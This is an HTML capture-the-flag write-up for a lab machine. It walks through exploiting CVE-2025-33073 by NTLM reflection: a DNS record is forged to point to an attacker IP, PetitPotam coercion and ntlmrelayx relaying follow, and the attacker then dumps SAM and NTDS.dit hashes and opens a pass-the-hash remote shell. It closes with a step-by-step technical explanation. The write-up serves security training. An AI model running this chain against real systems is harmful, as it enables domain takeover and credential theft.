<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Write-up - NTLM Reflection: CVE-2025-33073</title>
    <style>
        /* Base styles */
        body {
            font-family: 'Segoe UI', Calibri, sans-serif;
            line-height: 1.6;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            color: #333333;
            background: #1a1a1a;
        }

        /* Headings */
        h1 {
            font-size: 24px;
            font-weight: 800;  /* Augmenté de 600 à 800 pour plus de gras */
            color: #d97706; /* orange foncé */
            margin-bottom: 0.5em;
            font-family: 'Segoe UI', sans-serif;
            }


        h2 {
            font-size: 18px;
            font-weight: 700;  /* Augmenté de 500 à 700 pour plus de gras */
            color: #047857; /* vert foncé */
            margin-bottom: 1em;
            font-family: 'Segoe UI', sans-serif;
            }


        h3 {
            font-size: 18px;
            font-style: italic;
            color: #3b3b3b;
            margin-top: 20px;
        }

        /* Paragraphs and text */
        p {
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 16px;
            text-align: justify;
        }

        /* Command blocks and code */
        pre, code {
            font-family: Consolas, Menlo, monospace;
            border-radius: 4px;
        }

        pre {
            background-color: #1e1e1e;
            padding: 15px;
            overflow-x: auto;
            margin: 15px 0;
        }

        code {
            color: #b5f4a5;
            background-color: #1e1e1e;
            padding: 2px 5px;
        }

        /* Lists */
        ul, ol {
            padding-left: 20px;
            margin-bottom: 16px;
        }

        li {
            margin-bottom: 10px;
        }

        /* Info and Important blocks */
        .info, .important {
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
            background-color: #88b3d6;
            position: relative;
            padding-left: 50px;
        }

        .info::before, .important::before {
            content: 'ⓘ';
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            color: #0d6efd;
        }

        .info h2, .important h2 {
            margin-top: 0;
            font-size: 20px;
            color: #0d6efd;
            text-align: left;
        }

        .important {
            background-color: #fff5e6;
        }

        .important::before {
            content: '⚠';
            color: #ff9800;
            font-weight: bold;
        }

        .important h2 {
            color: #ff9800;
        }

        /* Terminal command styling */
        .command-block {
            background-color: #1e1e1e;
            color: #b5f4a5;
            font-family: Consolas, Menlo, monospace;
            padding: 15px;
            border-radius: 4px;
            margin: 15px 0;
            overflow-x: auto;
        }

        .prompt {
            color: #ff5252;
            font-weight: bold;
        }

        /* Images */
        img {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 20px auto;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        /* Banner image styling */
        .banner-image {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 0 auto 30px auto;
            border: none;
            border-radius: 8px;
        }

        /* Section styling */
        .section {
            background-color: white;
            padding: 25px;
            margin-bottom: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
                /* Conteneur principal */
        .question-box {
        background-color: #fff9e6; /* fond légèrement beige/orangé */
        border: 1px solid #f0d9c2; /* bordure douce */
        border-radius: 8px;
        padding: 20px 24px;
        font-family: "Segoe UI", Roboto, Arial, sans-serif;
        color: #333;
        line-height: 1.6;
        max-width: 100%;
        margin: 20px auto;
        box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }

        /* En-tête "Question" */
        .question-box::before {
        content: "❓Question";
        display: block;
        font-weight: 600;
        color: #a05d00; /* ton brun/orangé */
        margin-bottom: 12px;
        font-size: 1rem;
        }

        /* Titre interne (How it works?) */
        .question-box h3 {
        color: #007a7c; /* vert-bleu doux */
        margin-top: 0;
        margin-bottom: 12px;
        font-size: 1.25rem;
        }

        /* Corps du texte */
        .question-box p {
        margin: 0 0 10px;
        }

        /* Code inline */
        .question-box code {
        background-color: #e9ebf0;
        color: #333;
        font-family: "Courier New", monospace;
        font-size: 0.95rem;
        padding: 2px 6px;
        border-radius: 4px;
        }

        /* Code block si nécessaire */
        .question-box pre {
        background-color: #f8f9fb;
        padding: 12px;
        border-radius: 6px;
        overflow-x: auto;
        font-family: "Courier New", monospace;
        font-size: 0.9rem;
        border: 1px solid #e2e4e7;
        }

        /* Styles spécifiques pour How it works */
        .step-section {
            margin: 25px 0;
            padding: 15px;
            background-color: #f8f9fa;
            border-left: 4px solid #047857;
            border-radius: 4px;
        }

        .step-title {
            color: #047857;
            font-size: 1.2em;
            font-weight: 600;
            margin-bottom: 15px;
        }

        .code-example {
            background-color: #2d2d2d;
            color: #e0e0e0;
            padding: 12px;
            border-radius: 4px;
            font-family: Consolas, monospace;
            margin: 10px 0;
        }

        .sub-step {
            margin-left: 20px;
            border-left: 2px solid #ddd;
            padding-left: 15px;
            margin-top: 10px;
        }

        .reference {
            background-color: #e9ecef;
            padding: 15px;
            border-radius: 4px;
            margin-top: 20px;
            font-style: italic;
        }

        /* Print styles */
        @media print {
            body {
                padding: 20px;
                max-width: 100%;
            }
            pre, code, .command-block {
                background-color: #f8f9fa !important;
                color: #333 !important;
                border: 1px solid #ddd;
            }
        }

        /* Signature styling */
        .signature {
        text-align: center;
        margin-top: 50px;
        padding: 20px;
        color: #9333ea;
        font-family: 'Segoe UI', sans-serif;
        font-size: 1.2em;
        font-weight: 600;
        letter-spacing: 2px;
        border-top: 2px solid #9333ea;
        background: linear-gradient(to right, #ffffff, #f3e8ff, #ffffff);
    }

    /* Navigation buttons */
    .nav-buttons {
        position: fixed;
        left: 20px;
        top: 20px;
        z-index: 1000;
    }

    .menu-button {
        background-color: #2d2d2d;
        color: #e0e0e0;
        border: none;
        padding: 10px 20px;
        border-radius: 5px;
        cursor: pointer;
        font-family: 'Segoe UI', sans-serif;
        transition: all 0.3s ease;
        box-shadow: 0 2px 4px rgba(0,0,0,0.2);
    }

    .menu-button:hover {
        background-color: #404040;
        transform: translateY(-2px);
    }

    .scroll-top {
        position: fixed;
        bottom: 20px;
        right: 20px;
        background-color: #9333ea;
        color: white;
        width: 40px;
        height: 40px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        opacity: 0;
        transition: opacity 0.3s, transform 0.3s;
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        border: none;
    }

    .scroll-top.visible {
        opacity: 1;
    }

    .scroll-top:hover {
        transform: translateY(-3px);
        background-color: #a855f7;
    }
    </style>
</head>
<body>
    <div class="nav-buttons">
        <button class="menu-button" onclick="window.location.href='index.html'">Menu</button>
    </div>
    
    <button class="scroll-top" onclick="scrollToTop()" title="Retour en haut">↑</button>

    <script>
        // Fonction pour remonter en haut de page
        function scrollToTop() {
            window.scrollTo({
                top: 0,
                behavior: 'smooth'
            });
        }

        // Afficher/masquer le bouton de retour en haut
        window.onscroll = function() {
            var scrollButton = document.querySelector('.scroll-top');
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                scrollButton.classList.add('visible');
            } else {
                scrollButton.classList.remove('visible');
            }
        };
    </script>

    <img src="im-ntlm-signé.png" alt="NTLM Challenge Banner" class="banner-image">
        <h1>Introduction</h1>
        <div class="info">
            <h2>Historical Context: The NTLM Reflection Problem</h2>
            <p>CVE-2025-33073 is a critical privilege escalation vulnerability discovered in Windows systems that bypasses existing NTLM reflection mitigations. This vulnerability, also known as the "Reflective Kerberos Relay Attack" or "NTLM Reflection SMB Flaw," allows authenticated attackers to gain SYSTEM-level privileges on any Windows machine that doesn't enforce SMB signing.</p>
            
            <p>NTLM reflection attacks have plagued Windows systems for nearly two decades. NTLM reflection is a special type of NTLM authentication relay attack where the authentication is relayed back to the same machine from which it originated.</p>

            <p>Microsoft has been playing a continuous game of "whack-a-mole" with these vulnerabilities:</p>
            <ul>
                <li>MS08-068 (2008): Prevented SMB to SMB NTLM reflection</li>
                <li>MS09-013 (2009): Fixed HTTP to SMB reflection</li>
                <li>MS15-076 (2015): Patched DCOM to DCOM reflection</li>
            </ul>
        </div>
        <div class="important">
            <h2>Important</h2>
            <p>As is often the case in real-life Windows penetration tests, you will start the NTLM Reflection machine with the following account credentials that can be used to access the SMB service: <span class="Code"> sawan/R3flect0r</span></p>        
        </div>

        <h1>Nmap Results</h1>
        <h2>We performed a full aggressive port and service scan.</h2>
        <div class="command-block">
            <span class="prompt">$</span> nmap -sCV -T5 TARGET_IP
            <pre>PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=REFLECTION.reflection.thm
| Not valid before: 2025-09-13T14:39:19
|_Not valid after:  2026-03-15T14:39:19
|_ssl-date: 2025-10-22T10:20:19+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REFLECTION0
|   NetBIOS_Domain_Name: REFLECTION0
|   NetBIOS_Computer_Name: REFLECTION
|   DNS_Domain_Name: reflection.thm
|   DNS_Computer_Name: REFLECTION.reflection.thm
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-22T10:19:38+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: REFLECTION; OS: Windows; CPE: cpe:/o:microsoft:windows</pre>
        </div>
    

        <h1>Coercion Check</h1>
        <h2>Run the following commands to check the status of SMB signing and coercion vulnerabilities:</h2>
        <div class="command-block">
            <span class="prompt">$</span> netexec smb TARGET_IP -u sawan -p R3flect0r -M coerce_plus
        </div>
        <img src="1-1.png" alt="screen">


        <h1>DNS Registration</h1>
        
        
        <h2>Run the following command to add the new DNS entry for the following record 
            (localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA) pointing to the attacker's machine IP..</h2>

        <div class="command-block">
            <span class="prompt">$</span> python3 dnstool.py -u 'reflection.thm'\\'sawan' -p 'R3flect0r' --action add --record 
            localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA --data ATTACKER_IP TARGET_IP 
        </div>

        <img src="1-2.png" alt="screen">
    
        
        <h2>Verify that the DNS record has been created successfully and is pointing to the attacker's machine.</h2>
        <div class="command-block">
            <span class="prompt">$</span> python3 dnstool.py -u 'reflection.thm'\\'sawan' -p 'R3flect0r' --action query --record 
            localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA --data ATTACKER_IP TARGET_IP 
        </div>
        <img src="1-3.png" alt="">
        
        
        
        
        
        <h2>It can also be verified using the following dig command:</h2>
        <div class="command-block">
            <span class="prompt">$</span> dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.reflection.thm @TARGET_IP 
        </div>
        <img src="1-4.png" alt="">

    
        <h1>Dumping the SAM Hashes</h1>

        <h2> Run the ntlmrelayx to intercept the NLTM authentication and relay it back to the target</h2>
        <div class="command-block">
            <span class="prompt">$</span> impacket-ntlmrelayx -t smb://TARGET_IP -smb2support --no-http-server 
        </div>
        <img src="1-5.png" alt="">



        <h2>We will now use NetExec to coerce the target host into initiating an outbound NTLM authentication using our spoofed DNS name.</h2>
        <div class="command-block">
            <span class="prompt">$</span> netexec smb TARGET_IP -u sawan -p R3flect0r -M coerce_plus -o METHOD=PetitPotam 
            LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 
        </div>
        <img src="1-6.png" alt="">



        <h2>Once the coercion succeeds, the ntlmrelayx tool will extract the SAM hashes from the target host.</h2>
        <img src="1-7.png" alt="">




        <div class="important">
            <h2></h2>
            <p>You can now answer Question 1 with the NTLM hash of the Administrator account.</p>
        </div>
        <div class="info">
            <h2>Bonus</h2>
            <p>We have successfully dumped the SAM hashes from the target host. Although it's not required, we can crack the hash to retrieve the local administrator password.</p>
        </div>
        <img src="1-8.png" alt="hash crack">

















        <h1>Accessing the Filesystem </h1>
        
        
        <h2>Note that the target host is a domain controller, and we are not able to authenticate to the system using the local administrator hash simply by dumping the SAM hashes. 
            So, let's exploit the NTLM Reflection vulnerability again to access the file systems.</h2>
        <h3>Rerun the ntlmrelayx, but this time with -smb2support and -i flag (-i flag will open an interactive shell for accessing the SMB server).</h3>
        <div class="command-block">
            <span class="prompt">$</span> impacket-ntlmrelayx -t smb://TARGET_IP -smb2support -i
        </div>
        <img src="2-1.png" alt="screen">
        
        
        <h2>Next, we use NetExec again to coerce the target host into initiating an outbound NTLM authentication using our spoofed DNS name.</h2>
        <div class="command-block">
            <span class="prompt">$</span> netexec smb TARGET_IP -u sawan -p R3flect0r -M coerce_plus -o METHOD=PetitPotam 
            LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
        </div>
        <img src="2-2.png" alt="screen">


        <h2>Once the coercion succeeds, ntlmrelayx will open a SMB client shell via TCP on 127.0.0.1:11000</h2>
        <img src="2-3.png" alt="screen">

        <h2>Connect to the SMB client shell using netcat and access the file systems with administrative privileges.</h2>
        <img src="2-4.png" alt="screen">

        <img src="2-5.png" alt="screen">


        <div class="important">
            <h2></h2>
            <p>You can now answer Question 2 with the flag.</p>
        </div>












        <h1>Dumping Credentials from Domain Controller </h1>
        
        
        <h2>As we are exploiting NTLM Reflection on the domain controller, not on the workstation, dumping the SAM hashes will not be very helpful. So, let's dump NTDS.dit using Volume Shadow Copy Service (VSS). 
            Rerun ntlmrelayx with the “-socks” flag to create a SOCKS proxy connection for every successful relay.</h2>
        <div class="command-block">
            <span class="prompt">$</span> impacket-ntlmrelayx -t smb://TARGET_IP -smb2support -socks
        </div>
        <img src="3-1.png" alt="screen">
        
        
        <h2>Next, use NetExec again to coerce the target host into initiating an outbound NTLM authentication using our spoofed DNS name.</h2>
        <div class="command-block">
            <span class="prompt">$</span> netexec smb reflection.thm -u sawan -p R3flect0r -M coerce_plus -o METHOD=PetitPotam 
            LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
        </div>
        <img src="3-2.png" alt="screen">


        <h2>Observe that we successfully received the connection and ntlmrelayx created a SOCKS proxy.</h2>
        <img src="3-3.png" alt="screen">

        
        
        <h2>Next, we will use impacket-secretsdump via proxychains. First, we’ll need to edit the “/etc/proxychains4.conf” 
            file and make sure it uses port 1080 (socks4), which is the default SOCKS port used by ntlmrelayx.</h2>
        <div class="command-block">
            <span class="prompt">$</span> proxychains4 -q impacket-secretsdump TARGET_IP -no-pass -just-dc -use-vss
        </div>
        <img src="3-4.png" alt="screen">

        <div class="important">
            <h2></h2>
            <p>You can now answer Question 3 with the NTLM hash of the SVC account.</p>
        </div>



        <h1>Remote Access with impacket-smbexec</h1>
        <h2>We will now access a remote shell with elevated privileges to answer Question 4.</h2>
        <div class="command-block">
            <span class="prompt">$</span> python3 /usr/share/doc/python3-impacket/examples/smbexec.py \
-hashes aad3b435b51404eeaad3b435b51404ee:***************763d6eb08635d \
svc@TARGET_IP
        </div>
        

        <img src="4-2.png" alt="screen of whoami">
        <div class="question-box">
        <h3>How it works?</h3>
        
        <div class="step-section">
            <div class="step-title">Step 1: DNS Record Manipulation</div>
            <p>The attack begins with creating a malicious DNS record using marshalled target information. 
                This technique, originally documented by James Forshaw, allows encoding additional data into DNS names..</p>

            <p>The attacker creates a DNS record like:</p>
            <div class="code-example">srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</div>
            <p>Or more universally:</p>
            <div class="code-example">localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</div>
            
            <div class="sub-step">
                <p>This DNS name contains:</p>
                <ul>
                    <li>Hostname part: srv1 or localhost</li>
                    <li>Marshalled data: 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</li>
                </ul>
            </div>
        </div>

        <div class="step-section">
            <div class="step-title">Step 2: Target Name Processing</div>
            <p>When Windows processes this target name for authentication:</p>
            <ul>
                    <li>Initial target name:cifs/srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</li>
                    <li>After marshalled data removal:cifs/srv1</li>
                    <li>Hostname extraction:srv1</li>
                </ul>
            <p>The LsapCheckMarshalledTargetInfofunction strips the marshalled data, leaving only the hostname. For detailed code analysis, click here.</p>
        </div>

        <div class="step-section">
            <div class="step-title">Step 3: Localhost Detection Logic</div>
            <p>The SspIsTargetLocalhostfunction then compares the extracted hostname against:</p>
            <ul>
                    <li>The machine's FQDN (e.g., SRV1.REFLECTION.THM)</li>
                    <li>The machine's hostname (e.g., SRV1) ←Match found!</li>
                    <li>The literal string localhost</li>
                </ul>
            <p>Since the hostname matches, Windows concludes this is a local authentication request.</p>
        </div>

        <div class="step-section">
            <div class="step-title">Step 4: Authentication Coercion </div>
            <p>The attacker uses techniques like PetitPotam to coerce a SYSTEM service (typicallylsass.exe) to authenticate to their controlled server. 
                PetitPotam exploits the MS-EFSRPC protocol to force authentication without requiring user interaction.</p>
        </div>
          <div class="step-section">
            <div class="step-title">Step 5: Local Authentication Bypass </div>
            <p>When the SMB client connects to the attacker's server:</p>
            <ul>
                    <li>Credential negotiation: Client requests authentication to the target</li>
                    <li>Target name evaluation:msv1_0!SspIsTargetLocalhostreturns TRUE</li>
                    <li>Local auth conditions met:</li>
                    <ul>
                        <li>Target appears to be localhost</li>
                        <li>No explicit credentials specified</li>
                        <li>Not requesting NULL session</li>
                    </ul>
                    <li>Local auth triggered: Client includes workstation and domain names in NTLM_NEGOTIATE</li>
                    <li>Server response: Attacker's server sets "Negotiate Local Call" flag</li>
                    <li>Token insertion: SYSTEM token gets placed in server context</li>  
            </ul>
        </div>
        <div class="step-section">
            <div class="step-title">Step 6: Token Relay and Impersonation </div>
            <p>The attacker's relay server:</p>
            <ul>
                    <li>Receives the NTLM authentication with SYSTEM token</li>
                    <li>Relays this authentication back to the target machine via SMB</li>
                    <li>Target accepts the authentication as local due to the "Negotiate Local Call" flag</li>
                    <li>Attacker now has SYSTEM-level access on the target machine</li>
            </ul>
        </div>
        <div class="step-section">
            <div class="step-title">Kerberos Subkey Exploitation </div>
            <p>When using Kerberos instead of NTLM:</p>
            <ul>
                    <li>Subkey creation:KerbMakeKeyExgenerates a random AES subkey</li>
                    <li>SYSTEM privilege check: If the user isNT AUTHORITY\SYSTEM,KerbCreateSKeyEntrystores the subkey and token</li>
                    <li>Machine account verification: Server checks if client name equals machine name</li>
                    <li>Subkey validation:KerbDoesSKeyExistconfirms the subkey exists and belongs to SYSTEM</li>
                    <li>Token elevation:KerbMakeTokenInformationV3creates a SYSTEM token with local admin privileges</li>
            </ul>
        </div>
        <div class="reference">
            Reference: <a href="https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025">
            NTLM Reflection Analysis - Synacktiv</a>
        </div>
    </div>

    <div class="signature">
        Write-up Reflection by zзd
    </div>

</body>
</html>


